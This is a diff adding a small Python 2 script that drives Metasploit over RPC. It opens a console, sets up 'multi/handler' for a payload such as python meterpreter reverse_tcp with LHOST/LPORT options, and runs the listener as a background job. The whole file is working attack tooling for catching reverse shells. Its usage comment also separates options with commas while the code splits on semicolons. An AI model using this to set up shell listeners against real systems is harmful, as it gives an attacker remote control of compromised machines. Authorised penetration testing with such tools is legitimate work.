@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+#
+# Usage:
+#   msf-handler python/meterpreter/reverse_tcp LPORT=43434,LHOST=192.168.42.6
+#
+
+from os import sys, path
+import time
+sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
+
+import rpcutils
+client = rpcutils.login()
+
+if len(sys.argv) < 2:
+    print 'What?!'
+    exit(1)
+
+cmds = []
+cid = client.call("console.create", [{}])["id"]
+client.call("console.read", [cid])
+
+cmds.append("use multi/handler")
+cmds.append("set PAYLOAD %s" % sys.argv[1])
+
+if len(sys.argv) == 3:
+    opts = sys.argv[2].split(";")
+    for o in opts:
+        o = o.split("=")
+        cmds.append("set %s %s" % (o[0], o[1]))
+
+cmds.append("run -j")
+cmds.append("")
+
+client.call("console.write", [cid, "\r\n".join(cmds)])
+while True:
+    time.sleep(2)
+    r = client.call("console.read", [cid])
+    if r.get("data"):
+        print r.get("data")
+    if not r.get("busy"):
+        break
+
+client.call("console.destroy", [cid])
